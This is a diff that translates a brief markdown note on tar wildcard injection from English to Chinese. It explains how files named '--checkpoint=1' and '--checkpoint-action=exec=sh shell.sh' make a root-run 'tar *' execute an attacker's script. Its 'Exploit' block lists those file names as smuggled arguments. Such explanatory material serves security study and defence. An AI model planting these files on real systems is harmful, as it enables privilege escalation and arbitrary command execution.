@@ -1,14 +1,14 @@
-# TAR Command Execution
-By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.	
+# TAR命令执行
+通过使用带有–checkpoint-action选项的tar命令, 可以在一个检查点后进行一个特定的行为。这个行为可能是一个用来在启动tar命令进程的用户（权限）下执行任意命令的恶意shell脚本。诱骗root用户使用这个选项是相当容易的，这也是通配符派的上用场的地方。
 
 ## Exploit
 
-These files work against a "tar *"
+这些文件对"tar *"造成恶意影响
 ```
 --checkpoint=1
 --checkpoint-action=exec=sh shell.sh
 shell.sh   (your exploit code is here)
 ```
 
-## Thanks to
+## 感谢
 * 
